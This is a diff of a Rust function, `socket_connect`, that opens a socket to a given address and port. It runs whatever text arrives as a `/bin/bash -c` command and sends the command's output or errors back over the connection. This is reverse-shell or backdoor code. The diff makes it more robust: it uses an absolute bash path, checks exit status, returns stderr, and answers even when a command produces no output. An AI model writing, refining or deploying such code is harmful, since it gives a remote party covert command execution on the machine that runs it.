@@ -13,24 +13,36 @@ pub fn socket_connect(addr: &String, port: &String) {
         let mut read_buf= [0u8; 1024];
         let bytes_read = connection.read(&mut read_buf).unwrap();
         let data = &read_buf[..bytes_read];
-        // println!("{}", str::from_utf8(&data).unwrap());
 
         // execute command
-        let command = Command::new("bash")
+        let command = Command::new("/bin/bash")
             .arg("-c")
             .arg(str::from_utf8(&data).unwrap())
             .output()
             .unwrap();
 
-        // convert to str
-        let raw = command.stdout;
-        let output = match str::from_utf8(&raw) {
-            Ok(v) => v,
-            Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
-        };
+        if command.status.success() == true { // ensure command success
+            let raw = command.stdout;
+            let output = str::from_utf8(&raw).unwrap();
 
-        // write
-        connection.write(output.as_bytes()).unwrap();
-        connection.flush().unwrap();
+            if output.len() > 0 {
+                connection.write(output.as_bytes()).unwrap();
+                connection.flush().unwrap();
+            } else if output.len() == 0 {
+                connection.write(" ".as_bytes()).unwrap();
+                connection.flush().unwrap();
+            }
+        } else { // catch command error
+            let raw = command.stderr;
+            let output = str::from_utf8(&raw).unwrap();
+
+            if output.len() > 0 {
+                connection.write(output.as_bytes()).unwrap();
+                connection.flush().unwrap();
+            } else {
+                connection.write("[COMMAND FAILED]".as_bytes()).unwrap();
+                connection.flush().unwrap();
+            }
+        }
     }
 }
